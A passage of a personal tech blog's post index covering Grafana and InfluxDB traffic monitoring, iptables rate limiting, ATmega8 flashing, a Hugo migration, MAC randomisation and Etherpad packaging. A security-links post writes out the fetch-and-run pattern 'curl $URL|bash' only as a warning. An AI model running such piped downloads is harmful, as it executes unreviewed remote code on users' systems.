https://pypi.python.org/pypi/psutil/ import psutil # for access to the procfs from docopt import docopt from time import sleep class interface: def __init__(self, interface_name): # test for /sys/class/net/{interface} is, else this is not existing interface # test for /sys/class/net/{interface}/link_mode is 1 if interface_name not in psutil.net_if_stats(): raise Exception(\u0026#39;invalid interace name!\u0026#39;) if not psutil.net_if_stats()[interface_name].isup: raise Exception(\u0026#39;interace is down!\u0026#39;) self.interface_name = interface_name self.data = [] def stats(self, interface_name): # 0, bytes_sent # 1, bytes_recv sent_a = psutil.net_io_counters(pernic=True)[self.interface_name][0] recv_a = psutil.net_io_counters(pernic=True)[self.interface_name][1] sleep(1) sent_b = psutil.net_io_counters(pernic=True)[self.interface_name][0] recv_b = psutil.net_io_counters(pernic=True)[self.interface_name][1] print(\u0026#39;TX/s:{0} RX/s:{1}\u0026#39;.format(sent_b - sent_a, recv_b - recv_a)) if __name__ == \u0026#39;__main__\u0026#39;: arguments = docopt(__doc__, version=\u0026#39;Interface static 0.0a\u0026#39;) if \u0026#39;\u0026lt;interface\u0026gt;\u0026#39; in arguments: iface = arguments[\u0026#39;\u0026lt;interface\u0026gt;\u0026#39;] net = interface(iface) net.stats(iface) else: print(arguments) When the code is execute with an valid interface, that\u0026rsquo;s up and running, you\u0026rsquo;ll get the traffic from the last second.\npython interface-statistic.py enp0s25 TX/s:102 RX/s:102 Putting everything together Next is to send the data to the influxdb and configure grafana to display this dataset. Here\u0026rsquo;s a hacky bash script to send it to the db. I just was to lacy at this point to do this proper in python.\n#!/bin/env bash while /bin/true; do out=$(python interface-statistic.py wlp3s0) curl -XPOST \u0026#39;http://192.168.56.200:8086/write?db=mydb\u0026#39; -d \u0026#34;traffic,host=x240 up=$(echo ${out}|cut -d \u0026#39;:\u0026#39; -f 2 |sed \u0026#39;s/[^0-9]*//g\u0026#39;),down=$(echo ${out}|cut -d \u0026#39;:\u0026#39; -f 3 )\u0026#34; done This will create a measurement in influxdb, with the tag host with value x240, with two field-keys. Their contains the value up and down. Let check this:\ninflux -precision rfc3339 Visit https://enterprise.influxdata.com to register for updates, InfluxDB server management, and monitoring. Connected to http://localhost:8086 version 1.1.1 InfluxDB shell version: 1.1.1 \u0026gt; use mydb Using database mydb SELECT \u0026#34;down\u0026#34;, \u0026#34;up\u0026#34; FROM \u0026#34;traffic\u0026#34; ... 16-12-30T17:05:50.226740631Z 1268 816 2016-12-30T17:05:51.319601571Z 3815 1836 2016-12-30T17:05:52.401584693Z 4467 3186 2016-12-30T17:05:53.512383018Z 1137 758 2016-12-30T17:05:54.600852827Z 2857 1200 2016-12-30T17:05:55.698312396Z 2814 1164 2016-12-30T17:05:56.81280255Z 2898 372 2016-12-30T17:05:57.885670347Z 3000 1284 2016-12-30T17:05:59.040079442Z 2264 792 2016-12-30T17:06:00.134257182Z 1522 552 2016-12-30T17:06:07.686102817Z 2210 416 ... Here we go! Now we can utilize this in the dashboard!\ncreate a dashboard in grafana Last step is to add a dashboard and let select the right data set. The result can be seen above.\nrecap grafana is a nice tool, it also includes an alert feature that will allow you to notify in case a thrash value is hit. It\u0026rsquo;s a tool I\u0026rsquo;m going to use in the further more.\nbest regards Akendo\n","permalink":"https://blog.akendo.eu/post/2016-12-31-grafana/","tags":["grafana","influxdb"],"title":"grafana"},{"categories":null,"contents":"I wish everyone a happy new year!\nbest regards Akendo\n","permalink":"https://blog.akendo.eu/post/2016-12-31-happy-new-year-2017/","tags":null,"title":"Happy new year 2017"},{"categories":null,"contents":"I\u0026rsquo;ll just drop down this link\nhttps://aeon.co/essays/how-the-internet-flips-elections-and-alters-our-thoughts\nI like to highlight this:\n\u0026hellip; namely that powerful corporations were constantly looking for, and in many cases already applying, a wide variety of techniques for controlling people without their knowledge.\nIt gives you hint what to expect.\nbest regards Akendo\n","permalink":"https://blog.akendo.eu/post/2016-12-27-a-valueable-link/","tags":null,"title":"A valueable Link"},{"categories":null,"contents":"This is going to be a collection of security related Links.\nProgramming A Hearthbleed in Rust\u0026hellip;\nTL;DR\nJust because you\u0026rsquo;re using a type save language don\u0026rsquo;t mean you can\u0026rsquo;t leak plaintext. This applies to Rust (Tedbleed) as Java (JetLeak).However the type safeness would reduce the impact of the vulnerability.\nhttps://tonyarcieri.com/would-rust-have-prevented-heartbleed-another-look\nHow Hearthbleed would be in Rust.\nhttp://www.tedunangst.com/flak/post/heartbleed-in-rust\nTony Arcier takes the time to disect the issue and comes to the conclution that rust would have prevented heartbleed.\nBash https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/\nPOC for NOT using curl $URL|bash. This allow you alter the download code based on your system piping something.\nHardwar Firmware Part III https://www.youtube.com/watch?v=UqxRPLfrpfA\u0026amp;feature=youtu.be\nFollow up in regards of ThunderStrike attack, as a presentation of coreboot payload call HEADs.\nProject page: https://trmm.net/Heads_33c3\nbest regards Akendo\n","permalink":"https://blog.akendo.eu/post/2016-12-26-links-about-security/","tags":null,"title":"Links about Security"},{"categories":[],"contents":"Merry Christmas to everyone!\nBest regards Akendo\n","permalink":"https://blog.akendo.eu/post/2016-12-24-merry-christmas/","tags":null,"title":"Merry Christmas"},{"categories":null,"contents":"On a quick note\nI had to limit the amount of packages that was directed to a single port. Usually this can be configure within the boundaries of the application. However this was an UDP based application and I wasn\u0026rsquo;t aware of any configuration parameters what would have allow this.\nSo I jumped to the firewall and limit the rate via iptables:\niptables -A FORWARD -s 0.0.0.0/0 -d 10.0.0.3/32 \\ -p udp \\ -i eth0 \\ -o virbr0 \\ --dport 9987\\ -m state --state NEW \\ -m limit --limit 5/second \\ -j ACCEPT iptables -A FORWARD -s 0.0.0.0/0 -d 10.0.0.3/32 -p udp -i eth0 -o virbr0 --dport 9987\\ -j LOG --log-prefix \u0026#34;BRUST UDP DROP \u0026#34; --log-ip-options iptables -A FORWARD -s 0.0.0.0/0 -d 10.0.0.3/32 -p udp -i eth0 -o virbr0 --dport 9987 -j DROP This will allow up to 5 new connection to the port at the same time. When more connection are occur they will be dropped and logged.\nSources set packet rate limit via iptables Using iptables to rate-limit incoming connections ","permalink":"https://blog.akendo.eu/post/2016-11-06-linux-rate-limit-a-connection-with-iptables/","tags":null,"title":"[Linux]Rate limit a connection with iptables"},{"categories":["Linux","Hardware","ATmega8"],"contents":"\nFor a class in my university, I have to flash a ATmega8 Chip. This is on a custom PCB including a own quartz, to allows the usage of a USB Port as interface instead of a classic ICSP. The chip will be registered to your PC as USB devices. On a Windows System you can use the Atmel Studio, to program it. It will create special a .hex file, including the compiled code of yours. With the bootloadHID tool it will be send to firmware to the chip.\nHowever for Linux the solution is a bit different. Atmel Studo is not working here, they support only Windows. So you have to do the steps in a manual way. Following steps:\nSetup the bootloadHID Generate the .hex files Upload On Linux When the chip is connected to your system it will register, but the kernel can not make much sense of this:\n[22182.023379] usb 1-2: new full-speed USB device number 18 using xhci_hcd [22182.136834] usb 1-2: device descriptor read/64, error -71 [22182.356816] usb 1-2: device descriptor read/64, error -71 [22182.576688] usb 1-2: new full-speed USB device number 19 using xhci_hcd [22182.690098] usb 1-2: device descriptor read/64, error -71 [22182.910128] usb 1-2: device descriptor read/64, error -71 [22183.130070] usb 1-2: new full-speed USB device number 20 using xhci_hcd [22183.130392] usb 1-2: Device not responding to setup address. [22183.337045] usb 1-2: Device not responding to setup address. [22183.543380] usb 1-2: device not accepting address 20, error -71 [22183.656720] usb 1-2: new full-speed USB device number 21 using xhci_hcd [22183.657038] usb 1-2: Device not responding to setup address. [22183.863701] usb 1-2: Device not responding to setup address. [22184.070053] usb 1-2: device not accepting address 21, error -71 [22184.070116] usb usb1-port2: unable to enumerate USB device Yet this is right, it\u0026rsquo;s a sign that the chip can be flashed. Just switch the hard switch to \u0026lsquo;Boot\u0026rsquo;. Now it could be flashed with bootloadHID.\nSetup of bootloadHID Someone was so nice and ported (or create it\u0026rsquo;s own?) the bootloadHID to Linux. So you\u0026rsquo;ll need to setup up this tool to flash the ATMega8. Grep the source code from github:\ncd src/ ~/src\u0026gt; git clone https://github.com/robertgzr/bootloadHID cd commandline/ make VENDORID=0x16c0 PRODUCTID=0x05DF The import details are the parameter for VENDORID and PRODUCTID, this determine which chip you\u0026rsquo;re running. I think you might can extract this infromation from the datasheet of the chip. For me someone told me what parameter I have to use. Without this parameter, the compiler will produce wrong code that most likely not work on the chip.\nThe make command will create a the ./bootloadHID. This will be later used to flash.\nGenerating .hex files In Linux we don\u0026rsquo;t have a Atmel Studio, so we need to create the .hex manual.\nI checked the make command the Studio use to create a .hex file.\navr-gcc.exe -x c -funsigned-char -funsigned-bitfields -DDEBUG -O1 -ffunction-sections -fdata-sections -fpack-struct -fshort-enums -g2 -Wall -mmcu=atmega8 -c -std=gnu99 -MD -MP -MF \u0026#34;$(@:%.o=%.d)\u0026#34; -MT\u0026#34;$(@:%.o=%. d)\u0026#34; -MT\u0026#34;$(@:%.o=%.o)\u0026#34; -o \u0026#34;$@\u0026#34; \u0026#34;$\u0026lt;\u0026#34; avr-gcc-x c -funsigned-char -funsigned-bitfields -DDEBUG -O1 -ffunction-sections -fdata-sections -fpack-struct -fshort-enums -g2 -Wall -mmcu=atmega8 -c -std=gnu99 The essential steps are:\navr-gcc -g -Os -mmcu=atmega8 -c demo.c avr-gcc -g -mmcu=atmega8 -o demo.elf demo.o avr-objcopy -j .text -j .data -O ihex demo.elf demo.hex This will device a flashable file as hex code. The Atmel Handbook provide further details on this topic. You just need to read some more pages.\nUpload Now we can upload our code onto the chip via:\nsudo ./bootloadHID demo.hex Don\u0026rsquo;t forget to switch from \u0026lsquo;Boot\u0026rsquo; mode away and a press on reset will start the new installed programm on the chip!\nSublimeAVR There is also a plugin for Sublime Text 3 that allows the usage of this script. I just took the Makefile from the project.\n","permalink":"https://blog.akendo.eu/post/2016-11-05-how-to-flash-an-atmega8/","tags":null,"title":"How to flash an ATmega8"},{"categories":[],"contents":"You have something to say? Do you like to provide feedback? Maybe all that you’re looking for is a neat chit-chat? Feel free to drop an e-mail to blog@akendo.eu.\n","permalink":"https://blog.akendo.eu/contact/","tags":null,"title":""},{"categories":["General","Blog"],"contents":"My trouble on the way to a new blogging software: I wanted to blog more, but an update of some ruby broke my blog\u0026hellip;.\nSo i try something new, bug it should be a statice website genrator After some searching I found this website:\nhttps://www.staticgen.com/\nI found some useful blog entrys.\nHugo is quite the same as jekelly, but with go developed. The blog entry makes a quite nice impression, so I\u0026rsquo;ll give it a try:\nthe installation in archlinux is quite simple:\nyaourt hugo The quickstart Video is very well done. Octopress doesn\u0026rsquo;t offer that much of documentation, so I can see this fact.\nThe first thing I see is that you create new directory for each side you want to have that makes a hugh differences.\nThe next thing what needs to be done is definine a thema, by default hugo doesn\u0026rsquo;t include any type of thema without you\u0026rsquo;ll have static html sides with no navigation.\ngit clone https://github.com/zyro/hyde-x In the configuration you can use the parameter to fix the theme for the creation of the site theme = \u0026quot;hyde-x\u0026quot;\nI copied the old posts into the new content/posts and lets see what hugo will have to complain about:\nERROR: 2016/05/28 Error parsing page meta data for post/2012-01-08-\u0026gt;move-gnome-to-fluxbox.html ERROR: 2016/05/28 yaml: line 2: did not find URI escaped octet ERROR: 2016/05/28 yaml: line 2: did not find URI escaped octet ERROR: 2016/05/28 Error parsing page meta data for post/2012-01-19-gentoojetty-with-a-war-file.html ERROR: 2016/05/28 yaml: line 2: did not find URI escaped octet ERROR: 2016/05/28 yaml: line 2: did not find URI escaped octet ERROR: 2016/05/28 Error parsing page meta data for post/2012-01-26-debiannginx-with-ssl.html ERROR: 2016/05/28 yaml: line 2: did not find URI escaped octet ERROR: 2016/05/28 yaml: line 2: did not find URI escaped octet ERROR: 2016/05/28 Error parsing page meta data for post/2012-02-24-libvirt-lvm-storge-backend.html ERROR: 2016/05/28 yaml: line 2: did not find URI escaped octet ERROR: 2016/05/28 yaml: line 2: did not find URI escaped octet ERROR: 2016/05/28 Error parsing page meta data for post/2013-01-22-update-blog-1.html ERROR: 2016/05/28 yaml: line 2: did not find URI escaped octet ERROR: 2016/05/28 yaml: line 2: did not find URI escaped octet CRITICAL: 2016/05/28 Errors reading pages: Error:yaml: line 2: did not find URI escaped octet for 2012-01-08-\u0026gt;move-gnome-to-fluxbox.html Error:yaml: line 2: did not find URI escaped octet for 2012-01-19-gentoojetty-with-a-war-file.html Error:yaml: line 2: did not find URI escaped octet for 2012-01-26-debiannginx-with-ssl.html Error:yaml: line 2: did not find URI escaped octet for 2012-02-24-libvirt-lvm-storge-backend.html Error:yaml: line 2: did not find URI escaped octet for 2013-01-22-update-blog-1.html The migration is not as simple as I did expect. This is because I have a lot of old files from my first blog as native html. I need to remove this to ensure that the server can start. I need to convert or add them later. In addtion I need to move the upload folder as well.\nWhile I was migrating, I found some fuck up in my configuration. I had once\u0026hellip; many copy of the same blog on many different computes. I mixed stuff up. So at some point i did united them to a single folder on my x240 But somehow some of the running version where empty.\nRight now I wasn able to fix that. So it also is something liek a clean the blog anyway. In addition I had to clean up the meta file so hugo would create the blog as intended.\nBut when you play a bit around you might get the solution. Which was simple, I had to adjust the yaml code on the old files. As far As i can see is that there are some draft now published to the blog. Only the release date went missing. But that\u0026rsquo;s detail work I will address tomorrow.\nNext is to create a archive site. This is usefull to get a list of all the public listed entries and compare them. But there is not such a thing in Hugo. But lucky me, there is a good form entry\nI followd the secound example. It\u0026rsquo;s not perfect but the I change some of the stuff. Like to add to the new theme the a 404 page:\ncp themes/hyde-x/layouts/404.html ./themes/purehugo/layouts/\nIn the end I had to manuel update my html page with a page\nDeployment via hugodeploy\nBut this also didn\u0026rsquo;t went well. In the end I just did run rsync of the public folder.\nIn the end I hade to add a redirect from nginx for the rss link. In the / location.\nrewrite ^/atom.xml /index.xml permanent; One think that comes to my mind is the question how well Hugo is going to work on the long run. Octopress was really nice, but with time the code stop working because the ruby package keep being changing. So far I can see that the project is more active than octopress ever was. But only time can tell\nbest regards Akendo\nPS: This need to be clean up later. But for the moment I\u0026rsquo;m done with the router\n","permalink":"https://blog.akendo.eu/post/2016-05-03-to-hugo/","tags":["Hugo"],"title":"to hugo"},{"categories":["General"],"contents":"Since some time now, I can\u0026rsquo;t write blog entries. Not because I don\u0026rsquo;t want to, but rather because the blog software has some issues. I\u0026rsquo;m the host to a archlinux user group. For this I had to create a website.\nWhile I like octopress, it turns out to be a wrapper around jekyll. So I was thinking: Why not using it directly? So I started to use jekyll. I set it up and everything seems great. But I made a huge mistake. I used the same rvm environment to host the ruby code for the user group, as my Blog is using. By installing some new jekyll plugins I updated the rvm envionment, with a lot of gems. Next thing I know is that there is some strange issue with the octorpess.\nWARN: Unresolved specs during Gem::Specification.reset: pygments.rb (~\u0026gt; 0.6.0) WARN: Clearing out unresolved specs. Please report a bug if this causes problems. Invalid command. Use --help for more information I had the hope to resolve this issue, but it didn\u0026rsquo;t went well. I was not able to fix it. So I just decidedto ditch octoress for something new..\n","permalink":"https://blog.akendo.eu/post/2016-03-09-problem-with-ruby/","tags":["Blog","Ruby","problem"],"title":"Problem with Ruby"},{"categories":null,"contents":"For me open source is about collaboration, independences and freedom. My intellectual freedom, that knowledge doesn\u0026rsquo;t belong to anyone but all of us. It allows us to lean and gain a more depth of understanding. It has also a economically side to this. Open source is the way I make my living.\nWhat does this mean? There is often a problem that need to be solved and some have already solved it. I don\u0026rsquo;t have to redo it. I just use the solution of him. By using open source I also gain independences. I might modify it to my own. Some tweak here, some fix there and the software works even more better than before.\nWhile it saves me often time there lies it downside as well. The code of someone else might cause problem and I need to invest time in fixing this. While open source might offer a better degree of security or code quality, this can only be verify or achieved by persons with the right degree of understanding. This type of persons are where the cost are. Years of training and work is necessary for them to accomplish this. Hence getting a problem fix in a professional matter almost always imply a high cost in money.\nOpen source works well when you have enough time and money for it. But to often there it\u0026rsquo;s just a half baked solution to a problem. At some point you need more developer to keep it working. In fact time, money and people are just a quantity. Your project needs the necessary significance. Without, no community will develop and the project perhaps will die.\nIn then end it\u0026rsquo;s a longtime investment that often have no pay off before. Only when you keep on track and stay focus it becomes rewarding and valuable experience.\n","permalink":"https://blog.akendo.eu/post/2016-03-09-what-opensource-means-for-me/","tags":null,"title":"What opensource means for me"},{"categories":null,"contents":"Failure of an technical guys,a retrospective.\nSince last April I started to attend the university. It all began with an introduction week. A get tougher of everyone who was new to this main subject. Some games to get to know each other.\nOne session was to find a tool everyone agreed to use. One of my wishes was not to use any services like Google or Facebook. Most of them agreed and I proposed to use a owncloud. For chatting it would be a Jabber and everying else we will use the mailling list from the University. During this session we met some students from they masters, begin \u0026lsquo;student buddies\u0026rsquo;. As an helpful gesture I took all of their notes from the previous years. I\u0026rsquo;ll then put all of this data into the owncloud.\nI started right away and installed a new owncloud. At first I use a docker container, but had to change due some performance issue. After some handwork it was done! I allow the users via a special script to login ejabber with their owncloud credentials.\nManaging all the user and import them to the owncloud was the most annoying part. I provide a\nI was happy! But I didn\u0026rsquo;t consider a important fact! the user.\nDespite of the data and \u0026lsquo;our\u0026rsquo; agreement, most of the user never used cloud at all. Some managed to use it.\nAs technical person, you tend to focus differently then others. But I missed this out and this made it to ofne of my biggest issues.\nFor example: Most of the users accessed the owncloud with a SmartPhone.I never expected that, my focus was on a desktop computer. One that can use the native client to access the cloud. Nevertheless most only use a SmartPhone. It might related to a change base lines, that users just want to access things on the fastest way possible, something that is a bit odd to me.\nIn additionally matter of fact was that when you want to use the owncloud app(on iPhone/Android) you need to pay money. I kind of only use a f-droid in wich the owncloud app comes for free. There is no free alternativ to iPhone.\nThe chat had similar issue. Also to get a good app for chatting imply paying money.\nAlso the fact that most of them don\u0026rsquo;t read the documentation or even trying to work with the service someone managed to them. Just the afford to take to get know of the technology seems oddly to much.\nAs a result everyone uses what they know best. Google and Facebook services.\nWhat brings me back to a blog post I read some time ago. I can not finding it in the moment, but the message was simple: What\u0026rsquo;s the point in Open Source software when the user is the limited itself in using it.\nIt brings me to the conclustion that you have to enforce users, but that only work when you have the power to this. In every other chase the user will look for a more simpler alternative. Beside teaching the user to work with this seems important, something I failed to do well enough.\nAs an additional note: I have to say it\u0026rsquo;s an quite impressive project and work very well. It has only one element I dislike, PHP. There are have some concerns about,but it manage to do a good job.\nAlso my expectation of the use of the Jabber Server. There is real work in there to get the ejabber service to use the owncloud user databases to authenticated them. It has even a integration into the website!\nBut the use case was again that they user rely on a desktop machine, not on a smart phone.\nAnother issue I missed is how afraid users are when they have to do something new. As User I tend to do the same, but in the sense: What\u0026rsquo;s the best work flow.\nBut it\u0026rsquo;s a good lesson to be learned.\n","permalink":"https://blog.akendo.eu/post/2016-02-26-my-failure-with-users/","tags":null,"title":"My failure with users"},{"categories":[],"contents":"Why bleeding edge is sometimes bad!\nI had a problem a while ago with my archlinux and it was necessary to get the latest kernel from testing. In general arch takes some days to week to push the upstream kernel into the main repository.\nSince then I had the testing repository enabled. Not minding it, till this one night. I fetched an update and after a quick look something was strange. PAM did stop to work. I wasn\u0026rsquo;t able to login anymore. Damit!\nIt was late that night, so I went to bed in hope that this issue might be fixed by the one who has caused it till next morning.\nSo I started my laptop with the kernel option single and took a look into the /varlog/pacman.log for the new updated packages:\n[2015-06-17 22:29] [ALPM] upgraded gnutls (3.4.1-1 -\u0026gt; 3.4.2-1) [2015-06-17 22:29] [ALPM] upgraded libtirpc (0.3.1-1 -\u0026gt; 0.3.2-1) [2015-06-17 22:29] [ALPM] upgraded plasma-framework (5.11.0-1 -\u0026gt; 5.11.0-2) PAM did not recieve an update? So one of this three might be the one package that causing some issues. Next was to look into systemd journal:\nJun 18 19:53:05 slaxy sudo[573]: root : TTY=tty1 ; PWD=/root ; USER=root ; COMMAND=list /usr/sbin/pacman --color auto -U /var/cache/pacman/pkg/libtirpc-0.3.1-1-x86_64.pkg.tar.xz Jun 18 19:53:05 slaxy sudo[574]: PAM unable to dlopen(/usr/lib/security/pam_unix.so): /usr/lib/libtirpc.so.1: undefined symbol: __rpc_get_default_domain Jun 18 19:53:05 slaxy sudo[574]: PAM adding faulty module: /usr/lib/security/pam_unix.so Aye\u0026hellip;. after a look into libtirpc, it was clear to me: libtirpc was broken. I downgraded the package.\nI took a look in the Archlinux site and check the latest changes for the package, reading in libtirpc following commit:\nadd upstream patch to fix broken sudo and pam And also that they did this commit 30 minutes before\u0026hellip;.. ayee.. The update was stop and no rolled out. So what did I learn:\nLife by the edge die by the edge\u0026hellip; or I might should use only testing when I really think I should. It might mean that you only get half backed updates. As far I can tell this was not the case very often yet. Probly the first time. Still I disabled testing for production reasons. Unless I have to change this.\nbest regards Akendo\n","permalink":"https://blog.akendo.eu/post/2016-02-23-thats-why-its-called-bleeding/","tags":null,"title":"That's why it's called bleeding"},{"categories":null,"contents":"The intention of this blog was in the beginning to have some sort of documentation. Yet I not managed to really keep up with this. Many reasons can be phrased why I didn\u0026rsquo;t did it. Time, focus,lack of motivation. But somehow I have develop a anxiety of making mistakes in my texts. Something that\u0026rsquo;s is frighten and stop me for publishing entries. Using any kind of argument to not do it.\nIn order to change this, I\u0026rsquo;m going to write a blog entry everyday over the next days. My goal is to embed this as a behavior into my everyday life routine. While the focus will not be only on technical things, I\u0026rsquo;m trying to. The target of this exercise is to improve my English writing skills and losing the fear of blogging.\nbest regards akendo\n","permalink":"https://blog.akendo.eu/post/2016-02-22-writing-ahead/","tags":null,"title":"writing ahead!"},{"categories":null,"contents":"During these days I have did some research in regards to privacy and reflected. This is done so I’m able to get a better view of this topic.\nPrivacy is something complex and one thing maybe very close to be foundation of our own freedom. There are four core elements to this:\nThe right to be left alone This is from my point of view the most important part. The physical right to be left alone and to be away from others. While humans are social animals, it’s important to gather ourself by being alone, this is an essential value to come closer to ourselves.\nA friend of mine did once said:\n\u0026ldquo;We\u0026rsquo;re only truly ourself when we\u0026rsquo;re being alone. Everyone has a mask to carry in front of each other. Most of can\u0026rsquo;t not live without it.\u0026rdquo;\nDiscretion and Intimacy When not being alone, we enjoy to be around people we like and we want to keep this relationships intimate. Often we think out loud in front of friends, maybe our parents, or coworkers. Often we would never say directly what is on our minds to not hurt them or maybe to protect ourself from harm.\nWe care for intimacy and discretion.\nAnonymity What should be open to the public, without reflecting back to us. Also, as an act of free speech, sometimes it’s necessary to remain nameless so we’re able to share our mind and ideas to others.\nAlso we understand the need for anonymity in a democratic system of voting.\nSelf determination information discloser Diminish and control of data that is direct or indirect related to us.\nWhat is the kind of information we care to reveal to others ? Maybe it is just limiting the possibilty of it\u0026rsquo;s usage. Corporations that we entrust with our bank data should keep it only for billing and should not forward it to someone else.\nYet our desire to be found and recognized for our work by others give us the need to be seen in public. Information we care to share and we think gives others interest in us.\nAt last I like to highlight is this video of Glenn Gleenwald \u0026lsquo;:Why privacy matters\u0026rsquo; cause he explain it very well:\nso far Akendo\nEdit: Thanks to crowbar for his help!\n","permalink":"https://blog.akendo.eu/post/2015-03-08-some-work/","tags":null,"title":"Some work about Privacy"},{"categories":null,"contents":"There is something on my mind for a while:\nEncryption is a expression of free speech?\nI think so atleast\n","permalink":"https://blog.akendo.eu/post/2015-02-18-something-on-my-mind/","tags":null,"title":"Something on my mind"},{"categories":null,"contents":"I used to travel more over the past year. Goal was different places: England, Belgian. This means I also have to use untrusted wireless connection.\nThis leaves a good trace wherever you go. Simply by the fact that the MAC-Address being used every time you do a connection to any wlan. This is often stored, but How long? There are good example where this information is begin havest for money.\nBeside, You never know who else listen and might want uses this data. To mitigate this problem I do following: I generate a random mac address for each new connection.\nAs an ArchLinux user I prefer to use the netctl tool. Within each new connection via a profile[1] with the netctl tool, it will by default source this two files:\n/etc/netctl/hooks\t# General script that will always be executed /etc/netctl/interfaces\t# Interface related scripts that will start when a profile uses this interface. So I\u0026rsquo;ll simply call macchanger for the interface that being use.\nThe script should be place in /etc/netctl/interfaces/ with the name of the interface. Here wlan0 as example\n/etc/netctl/interfaces/wlan0\nThe content of this file:\n#!/usr/bin/env sh /usr/bin/macchanger -r wlan0 Ensure that it can be executed:\nchmod o+x /etc/netctl/interfaces/wlan0\nNow whenever you start a profile that will use the wlan0 interface, it will be executing the /etc/netctl/interfaces/wlan0 script additional.\nSee:\nip link show wlan0 |tail -n1|grep -m1 -E '.([0-9,a-f]{2})' link/ether a2:0d:98:2d:ec:b5 brd ff:ff:ff:ff:ff:ff New connection - In this case a restart:\nnetctl restart SomeWlan ip link show wlan0 |tail -n1|grep -m1 -E '.([0-9,a-f]{2})' link/ether a2:4e:8d:2f:4a:3c brd ff:ff:ff:ff:ff:ff Another try:\nnetctl restart SomeWlan ip link show wlan0 |tail -n1|grep -m1 -E '.([0-9,a-f]{2})' link/ether 5a:d4:e5:4c:8f:ad brd ff:ff:ff:ff:ff:ff You can do the same with the any other interface.\nso far 4k3nd0\n[1]man netctl.profile\n","permalink":"https://blog.akendo.eu/post/2015-01-10-archlinux-random-mac-for-new-wireless-connections/","tags":null,"title":"[ArchLinux]random MAC-address for new wireless connections"},{"categories":null,"contents":"Happy new year everyone!\nSorry for posting so few here, I had some things to do. I know: \u0026rsquo;not enough discipline'\nAlso not enough time. But I hope to do some more work in the next days. NO, Not new years revolution. Just I\u0026rsquo;ll work fewer hours. So there will be more time for this blog.\nso far and good start into the next year.\nAkendo\n","permalink":"https://blog.akendo.eu/post/2015-01-01-new-year/","tags":null,"title":"New year"},{"categories":null,"contents":"So yesterday I upgraded my router to the latest version via Sysupgrade. The upgrade went fine without any problem. But when I tried to login to the router something went wrong. The ssh connection was reseted and closed.\nFuck! logout of my router! Does something wrong with dropbear? No no no\u0026hellip; ssh is working fine. Ok check the documenation\u0026hellip; what my I have change on the system that seems not be normal? Ah! I installed bash!\nLooks like when you do a Sysupgrade on OpenWRT that all installed packages will be lost. Duo my use to bash, I did enable bash as default shell for root within /etc/passwd.\nThat must be the problem! But after the upgrade the router the bash package was gone. To fix this problem I had to start the router in a failsafe mode. The default shell of OpenWrt is ash or sh (A Shell or Almquist shell). After I enable the failsafe mode, I just had to run mount_root. Then I change the entrie within /etc/passwd back to ash. A reboot later my login was working again. Lucky me\nBut what I do to get my bash? Simple .profile has been made for this. Here the best solution for this:\n[ -x /bin/bash ] \u0026amp;\u0026amp; exec /bin/bash\nSo things to be learned: Don\u0026rsquo;t try to be smart and re-define system-shells within /etc/passwd/. Use your .profile for this.\n","permalink":"https://blog.akendo.eu/post/2014-06-24-openwrt-trap/","tags":null,"title":"A OpenWrt sysupgrade trap"},{"categories":null,"contents":"In the last days I had to work on an out-dated version of etherpad. etherpad is a collaborative editing tool that runs with NodeJS. It\u0026rsquo;s used a lot for planning or maintenances. I was looking for a good way for deploying this onto different nodes. We had a version running with a MySQL database. So I wanted to migrate this as well. But I had some issue getting a etherpad onto my system deployed.\nProblem The installation was a git managed version (1.15) of etherpad. It was a quick and dirty installation. No init or upstart script was in place. The automatization was left out. It was hosted via nginx as reverse proxy to the NodeJS, but started via nohup with a provided script as normal user. Random crashes were normal. Someone had to go onto the server and start the service again.\nI did not want to touch the server. One problem when upgrading: I can\u0026rsquo;t roll back as easy as I wish when something is going wrong. I need to have a own instance of a VM for it. This should be able to run without any interaction of a person, even when it does go wrong. I also want to extend the current version with some more features.\nSo my task will to:\nMake this automatically via puppet Install via puppet it to a own VM. Migrate the databases to this VM. Extend the etherpad with some more useful things. The creation of the VM is easy as cake. But there are not real packages. This is caused by the fact that the offical website of etherpad is pointing to github master brach zip. But couldn\u0026rsquo;t find any packages by someone.\nfpm I dislike the deployment via git on a node. Here comes the fpm in place. It allows to create a simple package. deb or rpm, everything is possible. I heared about it on the puppetcamp in Berlin. It\u0026rsquo;s a ruby script that try to be as easy as possible. You can installed it via gem install or with ArchLinux yaourt ruby-fpm or look at the project site.\nNote: I do use rvm to maintain my ruby environments\nrvm use ruby-2.1.0 gem install fpm fpm --version 1.1.0 Make sure that you\u0026rsquo;re using at least version 1.1.0 or higher. I had some issue when I tired to unpack from a zip with an older version. It was version 0.9.8 (When I do remember right). The project is moving quite fast so make sure that it\u0026rsquo;s up-to-date. Here an example with the unzip folder:\nfpm -s dir\\ -t deb\\ -C /tmp \\ -n etherpad\\ -v '1.4.0-1-gc3a6a23'\\ -m 'Akendo \u0026lt;4k3nd0@gmail.com\u0026gt;'\\ --license 'GPLv3'\\ --url 'http://etherpad.org/'\\ --deb-user etherpad \\ --deb-group etherpad \\ --prefix /opt/ \\ --description 'Etherpad is a highly customizable Open Source online editor providing collaborative editing in really real-time' \\ etherpad-lite This will generate the package etherpad_1.4.0-1-gc3a6a23_amd64.deb I test it on my vagrant environment. I could use there simply dpkg -i etherpad_1.4.0-1-gc3a6a23_amd64.deb on Ubuntu and Debian. This will install the package to the folder /opt/etherpad.\npuppet I had a look into some puppet module for etherpad a while ago. There wasn\u0026rsquo;t to much promising. I only found two projects on github. This project seems to do the job in a basic way:\nvelaluqa/puppet-etherpad\nBut it had some weaknesses. As said before. It uses the git branch to deploy. git is depending on user input. To checkout or update things. But in most case to resolve merge issues. Doing this via puppet may can overwrite changes I later need.\nBeside it doesn\u0026rsquo;t track the dependency of the module. Further problem was that the module had some mistakes within the template of the settings.json.\nThe other project on github for etherpad But this is even in a more unusable state as the first one.\nSo lucky me got at least something.\nI started to deploy on Ubuntu 12.04, but it was not working. Wrong packages was installed. Some logical mistakes. I forked and fixed them. Also added a list of the dependency to track them via puppet-librarian. This allowed it to run in my vagrant environment. No one responded every since on my merge request, this is bad. Now I did a review and see that the puppet-code there wasn\u0026rsquo;t the \u0026lsquo;best\u0026rsquo;.\nSo I started to do more rework.\nI replace the module for node with a native ppa for Ubuntu to have the latest version of node. This allows to remove more puppet related dependency. But it binds the module more to Ubuntu. PPA seems only to work with Ubuntu.\nThings will be done more clearly. But how do I get my self build package to the VM?\nReprepro A colleague of mine, was working on another project showing me this neat software. It allows me to create a simple debian repository with any package I want. On the puppet camp there was this recommendation to host your packages called bintray But I need to be able to place this on a 